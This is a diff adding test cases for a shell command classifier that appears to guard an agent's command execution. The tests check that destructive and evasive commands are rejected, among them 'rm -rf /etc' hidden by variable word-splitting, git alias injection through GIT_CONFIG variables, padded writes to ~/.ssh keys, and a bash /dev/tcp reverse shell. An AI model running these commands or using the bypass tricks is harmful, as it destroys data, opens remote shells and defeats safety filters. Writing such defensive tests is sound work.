@@ -1046,6 +1046,101 @@ describe("classifyCommand", () => {
     });
   });
 
+  describe("quoted-whitespace assignment word-splitting (round 8)", () => {
+    test("quoted-whitespace var word-splitting attack is rejected", () => {
+      // s=' '; rm${s}-rf${s}/etc — bash word-splits to `rm -rf /etc`
+      // biome-ignore lint/suspicious/noTemplateCurlyInString: literal bash ${VAR}
+      expect(classifyCommand("s=' '; rm${s}-rf${s}/etc").ok).toBe(false);
+    });
+
+    test("empty-quoted var embedded in destructive context is rejected", () => {
+      // s=''; git push${s}--force origin main
+      // biome-ignore lint/suspicious/noTemplateCurlyInString: literal bash ${VAR}
+      expect(classifyCommand("s=''; git push${s}--force origin main").ok).toBe(false);
+    });
+
+    test("empty-value assignment followed by benign use is still allowed", () => {
+      expect(classifyCommand("s=; echo hello").ok).toBe(true);
+    });
+  });
+
+  describe("git env-config injection non-canonical count (round 8)", () => {
+    test("GIT_CONFIG_COUNT=01 GIT_CONFIG_KEY_0=alias.pu ... git pu (leading-zero count)", () => {
+      expect(
+        classifyCommand(
+          "GIT_CONFIG_COUNT=01 GIT_CONFIG_KEY_0=alias.pu GIT_CONFIG_VALUE_0=push git pu --force origin main",
+        ).ok,
+      ).toBe(false);
+    });
+
+    test("GIT_CONFIG_COUNT=+1 GIT_CONFIG_KEY_0=alias.pu (plus-sign count)", () => {
+      expect(
+        classifyCommand(
+          "GIT_CONFIG_COUNT=+1 GIT_CONFIG_KEY_0=alias.pu GIT_CONFIG_VALUE_0=push git pu origin main",
+        ).ok,
+      ).toBe(false);
+    });
+
+    test("GIT_CONFIG_KEY_0=alias.pu with no count still rejected", () => {
+      expect(
+        classifyCommand("GIT_CONFIG_KEY_0=alias.pu GIT_CONFIG_VALUE_0=push git pu origin").ok,
+      ).toBe(false);
+    });
+  });
+
+  describe("SSH write-verb token bypass (round 8)", () => {
+    test("tee padded with many operands still blocks (not bounded-span)", () => {
+      const pad = Array.from({ length: 60 }, (_, i) => `f${i}`).join(" ");
+      expect(classifyCommand(`printf key | tee ${pad} ~/.ssh/id_rsa`).ok).toBe(false);
+    });
+
+    test("cp with many sources then .ssh/ target blocks", () => {
+      const pad = Array.from({ length: 40 }, (_, i) => `f${i}`).join(" ");
+      expect(classifyCommand(`cp ${pad} ~/.ssh/id_rsa`).ok).toBe(false);
+    });
+
+    test("install -m 600 <many args> ~/.ssh/key blocks", () => {
+      const pad = Array.from({ length: 30 }, (_, i) => `src${i}`).join(" ");
+      expect(classifyCommand(`install -m 600 ${pad} ~/.ssh/key`).ok).toBe(false);
+    });
+
+    test("plain cp file /tmp/dst (no .ssh target, allowed)", () => {
+      expect(classifyCommand("cp /etc/hostname /tmp/dst").ok).toBe(true);
+    });
+  });
+
+  describe("git push --prune destructive (round 8)", () => {
+    test("git push --prune origin refs/heads/*:refs/heads/* is rejected", () => {
+      expect(classifyCommand("git push --prune origin refs/heads/*:refs/heads/*").ok).toBe(false);
+    });
+
+    test("git push origin --prune main is rejected (flag anywhere)", () => {
+      expect(classifyCommand("git push origin --prune main").ok).toBe(false);
+    });
+  });
+
+  describe("macOS case-insensitive system paths (round 8)", () => {
+    test("rm -rf /users/alice is rejected (lowercase macOS volume)", () => {
+      expect(classifyCommand("rm -rf /users/alice").ok).toBe(false);
+    });
+
+    test("rm -rf /system is rejected", () => {
+      expect(classifyCommand("rm -rf /system").ok).toBe(false);
+    });
+
+    test("rm -rf /library is rejected", () => {
+      expect(classifyCommand("rm -rf /library").ok).toBe(false);
+    });
+
+    test("rm -rf /applications is rejected", () => {
+      expect(classifyCommand("rm -rf /applications").ok).toBe(false);
+    });
+
+    test("chmod -R 777 /Users still rejected (canonical)", () => {
+      expect(classifyCommand("chmod -R 777 /Users").ok).toBe(false);
+    });
+  });
+
   describe("ClassificationResult shape", () => {
     test("blocked result has all required fields", () => {
       const result = classifyCommand("bash -i >& /dev/tcp/x/4444 0>&1");
